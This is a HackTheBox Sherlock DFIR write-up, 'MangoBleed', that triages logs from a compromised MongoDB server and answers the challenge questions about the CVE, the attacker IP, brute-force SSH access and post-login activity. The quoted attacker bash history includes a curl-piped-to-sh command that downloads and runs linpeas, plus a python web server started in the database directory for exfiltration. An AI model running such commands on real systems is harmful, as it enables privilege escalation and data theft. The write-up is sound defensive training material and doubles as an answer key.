---
layout: writeup
title: "MangoBleed — HTB Sherlock Writeup"
name: "MangoBleed"
category: "DFIR"
difficulty: "Very Easy"
platform: "HTB"
reading_time: 15
date: "2026-11-01 19:59:48 -05:00"
image: "/assets/images/writeups/mangobleed/mangobleed.png"
descrption: "An in-depth investigation of the MangoBleed sherlock from HackTheBox (HTB)"

#stuff
summary: "You were contacted early this morning to handle a high-priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.\n\nYou have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps."

#stuff
overview_title: "Blind Analysis"
overview:
  - |
    In the terminal, I did `find ./ -name "*.log" -o -name "*history*"`. That command goes through each subdirectory in my current directory (`./`) and looks for files whose names (`-name`) either end with .log or has "history" in its name. The "*" is a substitute for "any character". The purpose of that command was to identify some of the important files instead of manually going through each subdirectory. I found auth.log, mongod.log, python and bash history, and also apt history.log.
  - |
    First I wanted to find attacker's initial access so I tried to skim through auth.log. I found multiple failed login attempts for mongoadmin by 65.0.76.43. Then at "05:40:03", the attacker successfully signed in manually.
  - |
    After skimming through auth.log, I then tried to look at mongod.log but it had too many lines so I filtered for the attacker's IP to see if anything about him was explicitly mentioned by running `cat ./[root]/var/log/mongodb/mongod.log |grep 65.0.76.43`. That command printed out only the outputs of the `cat command` that contained the attacker's IP. The output was a lot so after a little while, I stopped the cat command with `ctrl + C`. Then I looked through the output and it was all about "connection accepted" "connection ended" over and over again in a small timeframe. I decided to add a `wc -l` command at the end of the previous command to see the amount of lines contained the attacker's IP, 75260 lines were found. I also decided to do the same thing but this time I filtered for both the attacker's IP and the word "connection", surprisingly enough, there were the same amount of lines as the previous command. This meant that all the things mongod.log logged that contained the attacker's IP was about connection attempts. All those connection attempts happened within 2 minutes and also they happened before the failed auth attempts found in auth.log.
  - |
    The next part of my analysis was to figure out what the attacker did after logging in, so I ran `cat` against the python and bash history files I came across previously. The python history and the bash history for the ubuntu user did not have any useful contents. The mongoadmin user's bash history showed a command being executed and then a python server being opened at the /var/lib/mongodb directory.

#stuff
side_notes:
  - |
    I renamed the logs folder from "uac-mongodbsync-linux-triage" to "logs" so that it's easier faster for me to type down in the terminal later on

#stuff
cards:
  card1:
    card_title: "question 01"
    question: "what is the cve id designated to the mongodb vulnerability explained in the scenario?"
    answer: "cve-2025-14847"
    explanation: |
                 We can look for the CVE-ID in google by searching for "mongobleed 2025 cve"

  card2:
    card_title: "question 02"
    question: "what is the version of mongodb installed on the server that the cve exploited?"
    answer: "8.0.16"
    terminal_title: "Mongodb Version"
    terminal_code1: "cat ./[root]/var/log/apt/history.log |grep -iC 5 mongo"
    terminal_output1: |-
      apt install -y mongodb-org=8.0.16 mongodb-org-server=8.0.16 mongodb-org-shell=8.0.16 mongodb-org-mongos=8.0.16 mongodb-org-tools=8.0.16
    explanation3: |
                    That command prints out the log file and then it grabs the lines containing the word mongo (case-insensitive because of -i) and also the -C 5 tell it to print the 5 lines before and after each match. You can combine multiple switches like -i and -C as one (-iC).


  card3:
    card_title: "question 03"
    question: "analyze the mongodb logs to identify the attacker's remote ip address used to exploit the cve."
    answer: "65.0.76.43"
    explanation: |
                 If we look through the mongod.log and auth.log files, we can see that the suspicious activities originated from 65.0.76.43

  card4:
    card_title: "question 04"
    question: "based on the mongodb logs, determine the exact date and time the attacker's exploitation activity began (the earliest confirmed malicious event)."
    answer: "2025-12-29 05:25:52"
    explanation: |
                 Since we already concluded that the attacker's interactions with mongod.log happened earliest and that all their interactions that were logged in mongod.log were suspicious, we can look for the first line of mongod.log that mentioned the attacker.
    terminal_title: "Earliest Exploit Attempt"
    terminal_code1: "cat ./[root]/var/log/mongodb/mongod.log |grep 65.0.76.43 |head -n 1"
    terminal_output1: |-
      {"t":{"$date":"2025-12-29T05:25:52.743+00:00"},"s":"I",  "c":"NETWORK",  "id":22943,   "ctx":"listener","msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340","isLoadBalanced":false,"uuid":{"uuid":{"$uuid":"099e057e-11c1-46ed-b129-a158578d2014"}},"connectionId":1,"connectionCount":1}}

  card5:
    card_title: "question 05"
    question: "using the mongodb logs, calculate the total number of malicious connections initiated by the attacker."
    answer: "75260"
    explanation: |
                 Since we already concluded in our analysis that all of the attacker's activity in mongod.log were about connection attempts, we can try to look through the events in mongod.log that were about the attacker to find the total.  
    terminal_title: "Connection Attempts"
    terminal_code1: "cat ./[root]/var/log/mongodb/mongod.log |grep 65.0.76.43 |wc -l"
    terminal_output1: |-
      75260
    explanation3: "The wc -l in this context means to count the total number of lines of output provided by the command on the left."

  card6:
    card_title: "question 06"
    question: "the attacker gained remote access after a series of brute-force attempts. the attack likely exposed sensitive information, which enabled them to gain remote access. based on the logs, when did the attacker successfully gain interactive hands-on remote access?"
    answer: "2025-12-29 05:40:03"
    terminal_title: "successfull login"
    terminal_code1: "cat ./[root]/var/log/auth.log |grep 65.0.7
6.43"
    terminal_output1: |-
      2025-12-29T05:39:25.959975+00:00 ip-172-31-38-170 sshd[39820]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55006 [preauth]
      2025-12-29T05:39:25.960736+00:00 ip-172-31-38-170 sshd[39821]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55014 [preauth]
      2025-12-29T05:40:03.475659+00:00 ip-172-31-38-170 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
      2025-12-29T05:48:28.249844+00:00 ip-172-31-38-170 sshd[40027]: Received disconnect from 65.0.76.43 port 46062:11: disconnected by user
      2025-12-29T05:48:28.250045+00:00 ip-172-31-38-170 sshd[40027]: Disconnected from user mongoadmin 65.0.76.43 port 46062

  card7:
    card_title: "question 07"
    question: "identify the exact command line the attacker used to execute an in-memory script as part of their privilege-escalation attempt."
    answer: "curl -l https://github.com/carlospolop/peass-ng/releases/latest/download/linpeas.sh | sh"
    explanation: |
                 The command can be found in the bash_history of the mongoadmin user.
    terminal_title: "Text"
    terminal_code1: "cat ./[root]/home/mongoadmin/.bash_history"
    terminal_output1: |-
      ls -la
      whoami
      curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
      cd /data
      cd ~
      ls -al
      cd /
      ls
      cd /var/lib/mongodb/
      ls -la
      cd ../
      which zip
      apt install zip
      zip
      cd mongodb/
      python3
      python3 -m http.server 6969
      exit

  card8:
    card_title: "question 08"
    question: "the attacker was interested in a specific directory and also opened a python web server, likely for exfiltration purposes. which directory was the target?"
    answer: "/var/lib/mongodb"
    explanation: |
                 If we look at the output of the command above, we can see the user switching directories: starting from /, then /var/lib/mongodb, /var/lib, then /var/lib/mongodb. Therefore, their last working directory before the python server was launched was /var/lib/mongodb.
  
#stuff
notes:
  - |
    cve-2025-14847
  - |
    T1110.001

#stuff
configure:
  prompt: "/home/ningen/mangobleed/logs>"

#<img src="/assets/images/writeups/x/yz.png" loading="lazy">"
---
{% include writeup-data.html %}
